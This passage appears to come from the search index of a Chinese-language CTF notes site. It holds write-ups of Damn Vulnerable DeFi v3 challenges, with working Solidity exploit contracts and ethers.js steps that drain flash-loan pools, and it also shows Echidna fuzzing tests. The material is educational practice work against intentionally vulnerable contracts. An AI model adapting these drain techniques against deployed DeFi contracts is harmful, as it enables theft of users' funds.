23 * v67 + 6 * v68 + 74 * v70 + 12 * v72 + 83 * v73 , v30 == 15 * v72 + 48 * v71 + 92 * v69 + 85 * v68 + 27 * v67 + 42 * v70 + 72 * v73 , v31 == 26 * v72 + 67 * v70 + 6 * v68 + 4 * v67 + 3 * v69 + 68 * v73 , v32 == 34 * v77 + 12 * v74 + 53 * v75 + 6 * v76 + 58 * v78 + 36 * v79 + v80 , v33 == 27 * v78 + 73 * v77 + 12 * v76 + 83 * v74 + 85 * v75 + 96 * v79 + 52 * v80 , v34 == 24 * v76 + 78 * v74 + 53 * v75 + 36 * v77 + 86 * v78 + 25 * v79 + 46 * v80 , v35 == 78 * v75 + 39 * v74 + 52 * v76 + 9 * v77 + 62 * v78 + 37 * v79 + 84 * v80 , v36 == 48 * v78 + 14 * v76 + 23 * v74 + 6 * v75 + 74 * v77 + 12 * v79 + 83 * v80 , v37 == 15 * v79 + 48 * v78 + 92 * v76 + 85 * v75 + 27 * v74 + 42 * v77 + 72 * v80 , v38 == 26 * v79 + 67 * v77 + 6 * v75 + 4 * v74 + 3 * v76 + 68 * v80 , v39 == 34 * v84 + 12 * v81 + 53 * v82 + 6 * v83 + 58 * v85 + 36 * v86 + v87 , v40 == 27 * v85 + 73 * v84 + 12 * v83 + 83 * v81 + 85 * v82 + 96 * v86 + 52 * v87 , v41 == 24 * v83 + 78 * v81 + 53 * v82 + 36 * v84 + 86 * v85 + 25 * v86 + 46 * v87 , v42 == 78 * v82 + 39 * v81 + 52 * v83 + 9 * v84 + 62 * v85 + 37 * v86 + 84 * v87 , v43 == 48 * v85 + 14 * v83 + 23 * v81 + 6 * v82 + 74 * v84 + 12 * v86 + 83 * v87 , v44 == 15 * v86 + 48 * v85 + 92 * v83 + 85 * v82 + 27 * v81 + 42 * v84 + 72 * v87 , v45 == 26 * v86 + 67 * v84 + 6 * v82 + 4 * v81 + 3 * v83 + 68 * v87 , v4 == 20247 , v5 == 40182 , v6 == 36315 , v7 == 36518 , v8 == 26921 , v9 == 39185 , v10 == 16546 , v11 == 12094 , v12 == 25270 , v13 == 19330 , v14 == 18540 , v15 == 16386 , v16 == 21207 , v17 == 11759 , v18 == 10460 , v19 == 25613 , v20 == 21135 , v21 == 24891 , v22 == 18305 , v23 == 27415 , v24 == 12855 , v25 == 10899 , v26 == 24927 , v27 == 20670 , v28 == 22926 , v29 == 18006 , v30 == 23345 , v31 == 12602 , v32 == 12304 , v33 == 26622 , v34 == 19807 , v35 == 22747 , v36 == 14233 , v37 == 24736 , v38 == 10064 , v39 == 14169 , v40 == 35155 , v41 == 28962 , v42 == 33273 , v43 == 21796 , v44 == 35185 , v45 == 14877 ) \u6c42\u89e3\u540e\uff0c\u5c06\u53d8\u91cf \\(v46, v47, ..., v86, v87\\) \u7684\u503c\u8f6c\u6362\u4e3a ASCII \u7801\u5373\u53ef\u83b7\u5f97 FLAG\u3010\u76f4\u63a5\u8fd0\u884c\u7a0b\u5e8f\u5e76\u8f93\u5165 \\(v46\\) \u7684\u503c\uff0c\u5f97\u5230\u7684\u7ed3\u679c\u4ecd\u7136\u662f error \u3011","title":"\u89e3\u9898\u601d\u8def"},{"location":"wargames/damn_vulnerable_defi/","tags":["blockchain","smart contract","DeFi","flashloan","hardhat","foundry"],"text":"#blockchain #smart contract #DeFi #flashloan #hardhat #foundry .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } How to Play \u00b6 Hardhat \u00b6 1 2 3 4 $ git clone git@github.com:tinchoabbate/damn-vulnerable-defi.git $ cd damn-vulnerable-defi $ git checkout v3.0.0 $ yarn install Code solution in the test/<challenge-name>/<challenge-name>.challenge.js yarn run <challenge-name> Foundry \u00b6 1 2 3 4 $ git clone git@github.com:StErMi/forge-damn-vulnerable-defi.git $ cd forge-damn-vulnerable-defi $ git submodule update --init --recursive $ forge remappings Code solution under the src/test forge test --match-contract <test-contract-name> 1. Unstoppable \u00b6 There\u2019s a tokenized vault with a million DVT tokens deposited. It\u2019s offering flash loans for free, until the grace period ends. To pass the challenge, make the vault stop offering flash loans. You start with 10 DVT tokens in balance. ERC4626 \u5b9e\u73b0 ERC20 \u4f5c\u4e3a\u80a1\u6743\u4ee3\u5e01\uff0c asset \u4e3a Vault \u7ba1\u7406\u7684\u5e95\u5c42\u4ee3\u5e01 UnstoppableVault \u521d\u59cb\u6301\u6709 \\(10^6\\) DVT (ERC20) \u548c \\(10^6\\) oDVT (ERC4626) 1 2 3 4 5 // unstoppable.challenge.js const TOKENS_IN_VAULT = 1000000n * 10n ** 18n ; await token . approve ( vault . address , TOKENS_IN_VAULT ); await vault . deposit ( TOKENS_IN_VAULT , deployer . address ); 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 // ERC4626.sol function convertToShares ( uint256 assets ) public view virtual returns ( uint256 ) { uint256 supply = totalSupply ; // the totalSupply of oDVT // \u5f53\u521d\u59cb totalSupply \u4e3a 0 \u65f6\uff0cdeposit assets \u5f97\u5230\u540c\u7b49\u6570\u91cf\u7684 shares return supply == 0 ? assets : assets . mulDivDown ( supply , totalAssets ()); // (assets * supply) / totalAssets() } function previewDeposit ( uint256 assets ) public view virtual returns ( uint256 ) { return convertToShares ( assets ); } function deposit ( uint256 assets , address receiver ) public virtual returns ( uint256 shares ) { require (( shares = previewDeposit ( assets )) != 0 , \"ZERO_SHARES\" ); // Need to transfer before minting or ERC777s could reenter. asset . safeTransferFrom ( msg . sender , address ( this ), assets ); _mint ( receiver , shares ); emit Deposit ( msg . sender , receiver , assets , shares ); afterDeposit ( assets , shares ); } \u6ce8\u610f\u5230 convertToShares(totalSupply) != balanceBefore \u5728\u4f7f\u7528\u4f9d\u636e totalSupply (oDVT) \u8ba1\u7b97\u5f97\u5230\u7684 shares \u548c totalAssets() ( UnstoppableVault \u7684 DVT \u4f59\u989d) \u8fdb\u884c\u6bd4\u8f83\uff0c\u5c3d\u7ba1\u5728\u521d\u59cb\u60c5\u51b5\u4e0b\u6ca1\u6709\u95ee\u9898\uff0c\u4f46\u662f... (\u20d4 *`\u03c9\u00b4 * )\u20d5\u219d totalSupply \u53ea\u80fd\u901a\u8fc7 deposit / mint \u589e\u52a0\uff0c\u800c balanceBefore \u53ef\u901a\u8fc7 DVT \u7684 transfer \u589e\u52a0 \u8981\u5c06 totalSupply \u8f6c\u6362\u6210 assets \u5e94\u4f7f\u7528 convertToAssets 1 2 3 4 5 6 7 8 9 10 // ReentrancyGuard.sol modifier nonReentrant () virtual { require ( locked == 1 , \"REENTRANCY\" ); locked = 2 ; _ ; locked = 1 ; } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 // UnstoppableVault.sol function totalAssets () public view override returns ( uint256 ) { assembly { // slot 0 \u5bf9\u5e94 ReentrancyGuard \u4e2d\u7684 locked if eq ( sload ( 0 ), 2 ) { mstore ( 0x00 , 0xed3ba6a6 ) revert ( 0x1c , 0x04 ) } } return asset . balanceOf ( address ( this )); } function flashLoan ( IERC3156FlashBorrower receiver , address _token , uint256 amount , bytes calldata data ) external returns ( bool ) { if ( amount == 0 ) revert InvalidAmount ( 0 ); if ( address ( asset ) != _token ) revert UnsupportedCurrency (); uint256 balanceBefore = totalAssets (); if ( convertToShares ( totalSupply ) != balanceBefore ) revert InvalidBalance (); uint256 fee = flashFee ( _token , amount ); // SafeERC20 wrappers around ERC20 operations that throw on failure ERC20 ( _token ). safeTransfer ( address ( receiver ), amount ); if ( receiver . onFlashLoan ( msg . sender , address ( asset ), amount , fee , data ) != keccak256 ( \"IERC3156FlashBorrower.onFlashLoan\" )) revert CallbackFailed (); ERC20 ( _token ). safeTransferFrom ( address ( receiver ), address ( this ), amount + fee ); ERC20 ( _token ). safeTransfer ( feeRecipient , fee ); return true ; } \u5411 UnstoppableVault \u53d1\u9001 DVT \u4f7f\u5f97 convertToShares(totalSupply) == balanceBefore \u65e0\u6cd5\u6210\u7acb\u5c31\u53ef\u4ee5\u963b\u6b62\u95ea\u7535\u8d37\u5566 XD 1 2 3 4 5 6 it ( 'Execution' , async function () { // get the contracts with player as signer token = token . connect ( player ); await token . transfer ( vault . address , INITIAL_PLAYER_TOKEN_BALANCE ); }); Using Echidna \u00b6 contracts/unstoppable/UnstoppableTest.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; import \"./ReceiverUnstoppable.sol\" ; import \"../DamnValuableToken.sol\" ; contract UnstoppableTest is IERC3156FlashBorrower { DamnValuableToken token ; UnstoppableVault vault ; uint256 constant TOKENS_IN_VAULT = 1000000e18 ; uint256 constant INITIAL_PLAYER_TOKEN_BALANCE = 10e18 ; constructor () { token = new DamnValuableToken (); vault = new UnstoppableVault ( token , msg . sender , msg . sender ); token . approve ( address ( vault ), TOKENS_IN_VAULT ); vault . deposit ( TOKENS_IN_VAULT , msg . sender ); // sending the attacker some tokens token . transfer ( address ( 0x10000 ), INITIAL_PLAYER_TOKEN_BALANCE ); } function onFlashLoan ( address initiator , address _token , uint256 amount , uint256 fee , bytes calldata ) external returns ( bytes32 ) { require ( initiator == address ( this ) && msg . sender == address ( vault ) && _token == address ( vault . asset ()) && fee == 0 ); ERC20 ( _token ). approve ( address ( vault ), amount ); return keccak256 ( \"IERC3156FlashBorrower.onFlashLoan\" ); } // check whether UnstoppableLender can always provide flash loans function echidna_test_flashloan () public returns ( bool ) { vault . flashLoan ( this , address ( token ), 10 , \"\" ); return true ; } } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 $ echidna . --contract UnstoppableTest --all-contracts --sender 0x10000 ... echidna_test_flashloan: failed!\ud83d\udca5 Call sequence: *wait* Time delay: 392942 seconds Block delay: 1545 *wait* Time delay: 389927 seconds Block delay: 9966 *wait* Time delay: 414579 seconds Block delay: 12172 *wait* Time delay: 322246 seconds Block delay: 65 *wait* Time delay: 271329 seconds Block delay: 883 *fallback* () from: 0x0000000000000000000000000000000000010000 Time delay: 138756 seconds Block delay: 3281 *wait* Time delay: 289607 seconds Block delay: 38344 *wait* Time delay: 372714 seconds Block delay: 55396 Event sequence: Transfer () from: 0xb4c79dab8f259c7aee6e5b2aa729821864227e84, error Revert 0x, error Revert 0x Unique instructions: 3719 Unique codehashes: 4 Corpus size: 1 Seed: 2655974979073607364 \u53c2\u8003\u8d44\u6599 \u00b6 ERC4626 BigInt - JavaScript | MDN 2. Naive Receiver \u00b6 There\u2019s a pool with 1000 ETH in balance, offering flash loans. It has a fixed fee of 1 ETH. A user has deployed a contract with 10 ETH in balance. It\u2019s capable of interacting with the pool and receiving flash loans of ETH. Take all ETH out of the user\u2019s contract. If possible, in a single transaction. FlashLoanReceiver.onFlashLoan() \u6ca1\u6709\u68c0\u67e5\u95ea\u7535\u8d37\u7684\u53d1\u8d77\u8005 uwu \u53ea\u597d\u300c\u5e2e\u300d FlashLoanReceiver \u53d1\u8d77\u95ea\u7535\u8d37\u6765\u6d88\u8017\u4f59\u989d\u5566 :D 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 // FlashLoanReceiver.sol function onFlashLoan ( address , address token , uint256 amount , uint256 fee , bytes calldata ) external returns ( bytes32 ) { assembly { // gas savings if iszero ( eq ( sload ( pool . slot ), caller ())) { mstore ( 0x00 , 0x48f5c3ed ) revert ( 0x1c , 0x04 ) } } if ( token != ETH ) revert UnsupportedCurrency (); uint256 amountToBeRepaid ; unchecked { amountToBeRepaid = amount + fee ; } _executeActionDuringFlashLoan (); SafeTransferLib . safeTransferETH ( pool , amountToBeRepaid ); return keccak256 ( \"ERC3156FlashBorrower.onFlashLoan\" ); } Exploit \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; import \"@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol\" ; import \"@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol\" ; contract NaiveReceiverHacker { address constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE ; function exploit ( address pool , address receiver ) external { for ( uint8 i = 0 ; i < 10 ; i ++ ) { IERC3156FlashLender ( pool ). flashLoan ( IERC3156FlashBorrower ( receiver ), // receiver ETH , // token 1 ether , // amount \"\" // data ); } } } 1 2 3 4 5 it ( 'Execution' , async function () { let hacker = await ( await ethers . getContractFactory ( \"NaiveReceiverHacker\" )). deploy (); // or use ethers.deployContract(\"NaiveReceiverHacker\"). However, hardhat-ethers(hardhat-toolbox) is not included in the package.json await hacker . exploit ( pool . address , receiver . address ); }); Using Echidna \u00b6 contracts/naive-receiver/NaiveReceiverTest.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; import \"./FlashLoanReceiver.sol\" ; contract NaiveReceiverTest { NaiveReceiverLenderPool pool ; FlashLoanReceiver receiver ; constructor () payable { pool = new NaiveReceiverLenderPool (); receiver = new FlashLoanReceiver ( address ( pool )); payable ( address ( pool )). transfer ( 1000 ether ); payable ( address ( receiver )). transfer ( 10 ether ); } // Invariant: the balance of the receiver contract can not decrease function echidna_test_balance () public view returns ( bool ) { return address ( receiver ). balance >= 10 ether ; } } naive-receiver.yml 1 2 3 balanceContract: 10000000000000000000000 # 10000 ether # Multi ABI: performing direct calls to every contract allContracts: true # multi-abi was renamed in echidna >= 2.1 1 2 3 4 5 6 7 8 9 10 11 $ echidna . --contract NaiveReceiverTest --config naive-receiver.yml ... echidna_test_balance: failed!\ud83d\udca5 Call sequence: flashLoan ( 0x62d69f6867a0a084c6d313943dc22023bc263691,0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee,30, \"ERC20: insufficient allowance\" ) Unique instructions: 1553 Unique codehashes: 4 Corpus size: 8 Seed: 8140429313308935610 ERROR:CryticCompile:Unknown file: contracts/hardhat-dependency-compiler/@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol Comment out dependencyCompiler in hardhat.config.js . echidna: Error running slither: Update Slither to the latest version. \u53c2\u8003\u8d44\u6599 \u00b6 How to use Echidna with multiple contracts \u00b7 crytic/echidna Wiki External testing 3. Truster \u00b6 The pool holds 1 million DVT tokens. You have nothing. To pass this challenge, take all tokens out of the pool. If possible, in a single transaction. target.functionCall(data) \u53ef\u4ee5\u4ee5 TrusterLenderPool \u7684\u8eab\u4efd\u8c03\u7528\u4efb\u610f\u5408\u7ea6\u7684\u4efb\u610f\u51fd\u6570 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 // TrusterLenderPool.sol function flashLoan ( uint256 amount , address borrower , address target , bytes calldata data ) external nonReentrant returns ( bool ) { uint256 balanceBefore = token . balanceOf ( address ( this )); token . transfer ( borrower , amount ); target . functionCall ( data ); if ( token . balanceOf ( address ( this )) < balanceBefore ) revert RepayFailed (); return true ; } \u90a3\u5c31\u6388\u6743 player \u4f7f\u7528 DVT \u597d\u4e86\uff01(\u03a6\u02cb\u03c9\u02ca\u03a6) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 it ( 'Execution' , async function () { let abi = [ \"function approve(address spender, uint256 amount)\" ]; let iface = new ethers . utils . Interface ( abi ); await pool . connect ( player ). flashLoan ( 0 , player . address , token . address , iface . encodeFunctionData ( \"approve\" , [ player . address , TOKENS_IN_POOL ]), ); await token . connect ( player ). transferFrom ( pool . address , player . address , TOKENS_IN_POOL ); }); \u53c2\u8003\u8d44\u6599 \u00b6 encodeABI to get call data with encoded parameters of contract method \u00b7 Issue #478 \u00b7 ethers-io/ethers.js 4. Side Entrance \u00b6 A surprisingly simple pool allows anyone to deposit ETH, and withdraw it at any point in time. It has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system. Starting with 1 ETH in balance, pass the challenge by taking all ETH from the pool. flashLoan() \u68c0\u67e5\u501f\u8d37\u524d\u540e SideEntranceLenderPool \u7684\u4f59\u989d\uff0c\u800c deposit \u80fd\u591f\u589e\u52a0\u5176\u4f59\u989d\u5e76\u4e3a msg.sender \u8bb0\u8d26 \u53ef\u5728 flashLoan() \u65f6 deposit() \uff0c\u7ed3\u675f\u540e withdraw() 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 // SideEntranceLenderPool.sol function deposit () external payable { unchecked { balances [ msg . sender ] += msg . value ; } emit Deposit ( msg . sender , msg . value ); } function withdraw () external { uint256 amount = balances [ msg . sender ]; delete balances [ msg . sender ]; emit Withdraw ( msg . sender , amount ); SafeTransferLib . safeTransferETH ( msg . sender , amount ); } function flashLoan ( uint256 amount ) external { uint256 balanceBefore = address ( this ). balance ; IFlashLoanEtherReceiver ( msg . sender ). execute { value : amount }(); if ( address ( this ). balance < balanceBefore ) revert RepayFailed (); } Exploit \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; import \"./SideEntranceLenderPool.sol\" ; contract SideEntranceHacker is IFlashLoanEtherReceiver { SideEntranceLenderPool pool ; constructor ( address instance ) { pool = SideEntranceLenderPool ( instance ); } function exploit () external payable { pool . flashLoan ( 1000 ether ); pool . withdraw (); payable ( tx . origin ). transfer ( 1000 ether ); } function execute () external payable { pool . deposit { value : 1000 ether }(); } receive () external payable {} } 1 2 3 4 it ( 'Execution' , async function () { let hacker = await ( await ethers . getContractFactory ( 'SideEntranceHacker' , player )). deploy ( pool . address ); await hacker . exploit (); }); Using Echidna \u00b6 contracts/side-entrance/SideEntranceTest.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; import \"./SideEntranceLenderPool.sol\" ; contract PoolDeployer { // SideEntranceTest contract should not be the owner of the initial funds, // or it can remove the funds by calling withdraw() function deploy () external payable returns ( address ) { SideEntranceLenderPool pool = new SideEntranceLenderPool (); pool . deposit { value : 1000 ether }(); return address ( pool ); } } contract SideEntranceTest is IFlashLoanEtherReceiver { SideEntranceLenderPool pool ; bool canWithdraw ; bool canDeposit ; uint256 depositAmount ; constructor () payable { PoolDeployer deployer = new PoolDeployer (); pool = SideEntranceLenderPool ( deployer . deploy { value : 1000 ether }()); } receive () external payable {} function setWithdraw ( bool _enabled ) public { canWithdraw = _enabled ; } function setDeposit ( bool _enabled , uint256 _amount ) public { canDeposit = _enabled ; depositAmount = _amount ; } // IFlashLoanEtherReceiver.execute() // some manual work to guide Echidna function execute () external payable { if ( canWithdraw ) { pool . withdraw (); } if ( canDeposit ) { pool . deposit { value : depositAmount }(); } } function flashLoan ( uint256 _amount ) public { pool . flashLoan ( _amount ); } function testBalance () public view { assert ( address ( pool ). balance >= 1000 ether ); } } side-entrance.yml 1 2 3 4 5 6 7 testMode: assertion # to check sth as well as changing the state balanceContract: 1000000000000000000000 # 1000 ether deployer: \"0x10000\" psender: \"0x10000\" contractAddr: \"0x10000\" # only the SideEntranceTest contract is the sender sender: [\"0x10000\"] 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 $ echidna . --contract SideEntranceTest --config side-entrance.yml ... execute () : passed! \ud83c\udf89 flashLoan ( uint256 ) : passed! \ud83c\udf89 setDeposit ( bool,uint256 ) : passed! \ud83c\udf89 setWithdraw ( bool ) : passed! \ud83c\udf89 testBalance () : failed!\ud83d\udca5 Call sequence: execute () Value: 0x8081 setDeposit ( true,32768 ) flashLoan ( 1 ) setDeposit ( false,0 ) setWithdraw ( true ) execute () testBalance () Event sequence: Panic ( 1 ) : Using assert. AssertionFailed ( .. ) : passed! \ud83c\udf89 Unique instructions: 1079 Unique codehashes: 2 Corpus size: 9 Seed: 4893652944378861842 5. The Rewarder \u00b6 There\u2019s a pool offering rewards in tokens every 5 days for those who deposit their DVT tokens into it. Alice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards! You don\u2019t have any DVT tokens. But in the upcoming round, you must claim most rewards for yourself. By the way, rumours say a new pool has just launched. Isn\u2019t it offering flash loans of DVT tokens? rewardToken \u7684\u5206\u53d1\u53d6\u51b3\u4e8e\u6700\u540e\u4e00\u6b21\u5feb\u7167 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 function distributeRewards () public returns ( uint256 rewards ) { if ( isNewRewardsRound ()) { _recordSnapshot (); } uint256 totalDeposits = accountingToken . totalSupplyAt ( lastSnapshotIdForRewards ); uint256 amountDeposited = accountingToken . balanceOfAt ( msg . sender , lastSnapshotIdForRewards ); if ( amountDeposited > 0 && totalDeposits > 0 ) { rewards = amountDeposited . mulDiv ( REWARDS , totalDeposits ); if ( rewards > 0 && ! _hasRetrievedReward ( msg . sender )) { rewardToken . mint ( msg . sender , rewards ); lastRewardTimestamps [ msg . sender ] = uint64 ( block . timestamp ); } } } \u6bcf \\(5\\) \u5929\u53ef\u4ee5\u5feb\u7167\u4e00\u6b21 1 2 3 4 5 6 7 8 9 10 11 12 13 uint256 private constant REWARDS_ROUND_MIN_DURATION = 5 days ; function _recordSnapshot () private { lastSnapshotIdForRewards = uint128 ( accountingToken . snapshot ()); lastRecordedSnapshotTimestamp = uint64 ( block . timestamp ); unchecked { ++ roundNumber ; } } function isNewRewardsRound () public view returns ( bool ) { return block . timestamp >= lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION ; } \u7531\u4e8e\u4e0d\u68c0\u67e5 deposit/withdraw \u7684\u65f6\u95f4\uff0c\u53ef\u5728 \\(5\\) \u5929\u540e\u501f\u52a9\u95ea\u7535\u8d37 deposit() \u521b\u5efa\u65b0\u7684\u5feb\u7167\u5e76\u83b7\u5f97 rewardToken \uff0c\u518d withdraw() \u5f52\u8fd8\u95ea\u7535\u8d37 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 function deposit ( uint256 amount ) external { if ( amount == 0 ) { revert InvalidDepositAmount (); } accountingToken . mint ( msg . sender , amount ); distributeRewards (); SafeTransferLib . safeTransferFrom ( liquidityToken , msg . sender , address ( this ), amount ); } function withdraw ( uint256 amount ) external { accountingToken . burn ( msg . sender , amount ); SafeTransferLib . safeTransfer ( liquidityToken , msg . sender , amount ); } Exploit \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; import \"@openzeppelin/contracts/token/ERC20/IERC20.sol\" ; import \"./FlashLoanerPool.sol\" ; import \"./TheRewarderPool.sol\" ; contract TheRewarderHacker { TheRewarderPool public immutable pool ; IERC20 public immutable dvt ; constructor ( address instance , address token ) { pool = TheRewarderPool ( instance ); dvt = IERC20 ( token ); } function exploit ( address lender , address token ) external { FlashLoanerPool ( lender ). flashLoan ( 1000000 ether ); IERC20 ( token ). transfer ( msg . sender , IERC20 ( token ). balanceOf ( address ( this ))); } function receiveFlashLoan ( uint256 amount ) external { dvt . approve ( address ( pool ), amount ); pool . deposit ( amount ); pool . withdraw ( amount ); dvt . transfer ( msg . sender , amount ); } } 1 2 3 4 5 6 7 8 it ( 'Execution' , async function () { await ethers . provider . send ( \"evm_increaseTime\" , [ 5 * 24 * 60 * 60 ]); // 5 days const TheRewarderHackerFactory = await ethers . getContractFactory ( 'TheRewarderHacker' , player ); const theRewarderHacker = await TheRewarderHackerFactory . deploy ( rewarderPool . address , liquidityToken . address ); await theRewarderHacker . exploit ( flashLoanPool . address , rewardToken . address ); }); Using Echidna \u00b6 \u56e0\u4e3a\u5408\u7ea6 TheRewarderPool \u6d89\u53ca\u5230 REWARDS_ROUND_MIN_DURATION \uff0c\u6240\u4ee5\u5728\u6d4b\u8bd5\u5408\u7ea6\u4e2d\u4f7f\u7528\u4e86 increaseTime() \uff0c\u5176\u5b83\u51fd\u6570\u903b\u8f91\u7c7b\u4f3c 4. Side Entrance \uff0c\u80fd\u591f Fuzzing \u51fa\u7ed3\u679c\uff0c\u4e0d\u8fc7 Hevm \u4e0d\u662f\u5fc5\u9700\u7684 uwu 1 2 3 function increaseTime () external { hevm . warp ( block . timestamp + 5 days ); } contracts/the-rewarder/TheRewarderTest.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; import \"./FlashLoanerPool.sol\" ; import \"./TheRewarderPool.sol\" ; interface IHevm { function warp ( uint256 ) external ; function prank ( address sender ) external ; } contract Deployer { uint256 constant TOKENS_IN_LENDER_POOl = 1000000 ether ; uint256 constant DEPOSIT_AMOUNT = 100 ether ; FlashLoanerPool public pool ; TheRewarderPool public rewarder ; constructor () { DamnValuableToken token = new DamnValuableToken (); pool = new FlashLoanerPool ( address ( token )); rewarder = new TheRewarderPool ( address ( token )); token . transfer ( address ( pool ), TOKENS_IN_LENDER_POOl ); for ( uint160 u = 0x20000 ; u < 0x60000 ; u += 0x10000 ) { token . transfer ( address ( u ), DEPOSIT_AMOUNT ); } } } /// @dev run with `echidna . --contract TheRewarderTest --config the-rewarder.yml` contract TheRewarderTest { FlashLoanerPool pool ; TheRewarderPool rewarder ; DamnValuableToken token ; RewardToken rewardToken ; IHevm hevm ; uint256 constant REWARDS_ROUND_MIN_DURATION = 5 days ; uint256 constant TOKENS_IN_LENDER_POOl = 1000000 ether ; uint256 constant DEPOSIT_AMOUNT = 100 ether ; bool canDeposit ; bool canWithdraw ; bool canDistribute ; constructor () { Deployer deployer = new Deployer (); pool = FlashLoanerPool ( deployer . pool ()); rewarder = TheRewarderPool ( deployer . rewarder ()); token = DamnValuableToken ( rewarder . liquidityToken ()); rewardToken = rewarder . rewardToken (); hevm = IHevm ( 0x7109709ECfa91a80626fF3989D68f67F5b1DD12D ); // addr from docs // users deposit for ( uint160 u = 0x20000 ; u < 0x60000 ; u += 0x10000 ) { hevm . prank ( address ( u )); token . approve ( address ( rewarder ), DEPOSIT_AMOUNT ); hevm . prank ( address ( u )); rewarder . deposit ( DEPOSIT_AMOUNT ); } hevm . warp ( block . timestamp + REWARDS_ROUND_MIN_DURATION ); for ( uint160 u = 0x20000 ; u < 0x60000 ; u += 0x10000 ) { hevm . prank ( address ( u )); rewarder . distributeRewards (); } } function setDeposit ( bool _enabled ) public { canDeposit = _enabled ; } function setWithdraw ( bool _enabled ) public { canWithdraw = _enabled ; } function setDistribute ( bool _enabled ) public { canDistribute = _enabled ; } function receiveFlashLoan ( uint256 amount ) external { require ( msg . sender == address ( pool )); if ( canDeposit ) { token . approve ( address ( rewarder ), amount ); rewarder . deposit ( amount ); } if ( canWithdraw ) { rewarder . withdraw ( amount ); } if ( canDistribute ) { rewarder . distributeRewards (); } token . transfer ( address ( pool ), amount ); } function flashLoan () external { uint256 lastRewardsTimestamp = rewarder . lastRecordedSnapshotTimestamp (); require ( block . timestamp >= lastRewardsTimestamp + REWARDS_ROUND_MIN_DURATION , \"It's useless to call flashLoan if no rewards can be taken as ETH is precious.\" ); // Thus, no need to use hevm to warp time pool . flashLoan ( TOKENS_IN_LENDER_POOl ); } function testBalance () public view { assert ( rewardToken . balanceOf ( address ( this )) < rewarder . REWARDS () * 99 / 100 ); } } the-rewarder.yml 1 2 3 4 5 6 testMode : assertion deployer : \"0x10000\" psender : \"0x10000\" contractAddr : \"0x10000\" sender : [ \"0x10000\" ] 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 $ echidna . --contract TheRewarderTest --config the-rewarder.yml ... receiveFlashLoan ( uint256 ) : passed! \ud83c\udf89 setDistribute ( bool ) : passed! \ud83c\udf89 setDeposit ( bool ) : passed! \ud83c\udf89 flashLoan () : passed! \ud83c\udf89 setWithdraw ( bool ) : passed! \ud83c\udf89 testBalance () : failed!\ud83d\udca5 Call sequence: setDeposit ( true ) from: 0x0000000000000000000000000000000000010000 *wait* Time delay: 434239 seconds Block delay: 16633 setWithdraw ( true ) from: 0x0000000000000000000000000000000000010000 flashLoan () from: 0x0000000000000000000000000000000000010000 testBalance () from: 0x0000000000000000000000000000000000010000 Event sequence: Panic ( 1 ) : Using assert. AssertionFailed ( .. ) : passed! \ud83c\udf89 Unique instructions: 7102 Unique codehashes: 6 Corpus size: 3 Seed: 5526863836465074544 \u53c2\u8003\u8d44\u6599 \u00b6 ERC20Snapshot controlling the unit testing environment - hevm 6. Selfie \u00b6 A new cool lending pool has launched! It\u2019s now offering flash loans of DVT tokens. It even includes a fancy governance mechanism to control it. You start with no DVT tokens in balance, and the pool has 1.5 million. Your goal is to take them all. governance \u624d\u80fd\u8c03\u7528 emergencyExit() \u8f6c\u51fa pool \u4e2d\u7684\u8d44\u91d1 1 2 3 4 5 6 7 8 9 